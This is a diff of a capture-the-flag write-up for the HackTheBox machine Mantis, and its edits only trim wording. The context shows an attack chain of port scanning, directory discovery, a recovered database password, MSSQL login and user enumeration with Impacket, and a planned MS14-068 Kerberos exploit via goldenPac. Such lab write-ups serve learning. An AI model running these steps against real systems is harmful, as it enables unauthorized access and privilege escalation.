@@ -6,7 +6,7 @@
 4. MS14-068 with Impacket
 
 ### Service Discovery
-So we start out as usual with a simple nmap scan
+We start out as usual with a simple nmap scan
 ```
 nmap -v -sC -sV -p- 10.10.10.52
 ```
@@ -59,7 +59,7 @@ Target: 10.10.10.52:1337
 [20:41:55] 500 -    3KB - /orchard                                                                    
 [20:45:27] 301 -  160B  - /secure_notes  ->  http://10.10.10.52:1337/secure_notes/                                                                                                                                                                                                                                                                                                                                      
 ```
-So that looks good a directory named "secure_notes".
+That looks good a directory named "secure_notes".
 
 
 ![](pics/2.PNG)
@@ -108,7 +108,7 @@ m$$ql_S@_P@ssW0rd!
 ```
 ### MSSQL Enumeration
 
-So great we have what looks like the sa password or maybe the admin user password from the note, so we check with mssqlclient  and can login with the admin account nice. 
+Great we have what looks like the sa password or maybe the admin user password from the note, so we check with mssqlclient  and can login with the admin account nice. 
 ```
 root@sushi:~# mssqlclient.py admin@10.10.10.52
 Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies
@@ -129,7 +129,7 @@ model
 msdb                                                                                                                              
 orcharddb                                 
 ```
-So we can poke around and check for any usernames in the database.
+We can poke around and check for any usernames in the database.
 ```
 SQL> SELECT COLUMN_NAME 'All_Columns' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='User' 
 blog_Orchard_Users_UserPartRecord 
@@ -194,7 +194,7 @@ CME          10.10.10.52:445 MANTIS          james (1103)/LogonCount: 26
 ```
 ### MS14-068
 
-So lets try this account with another impacket tool, goldenPac, against the kerberos on this machine. First add these two lines to /etc/hosts
+Lets try this account with another impacket tool, goldenPac, against the kerberos on this machine. First add these two lines to /etc/hosts
 ```
 10.10.10.52  mantis.htb.local
 10.10.10.52  htb.local
@@ -228,4 +228,4 @@ http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html
 
 https://www.trustedsec.com/2014/12/ms14-068-full-compromise-step-step/
 
-So thanks to Hackthebox.eu for all the great machines, and lkys37en for creating this one was a fun time.
+Thanks to Hackthebox.eu for all the great machines, and lkys37en for creating this one was a fun time.
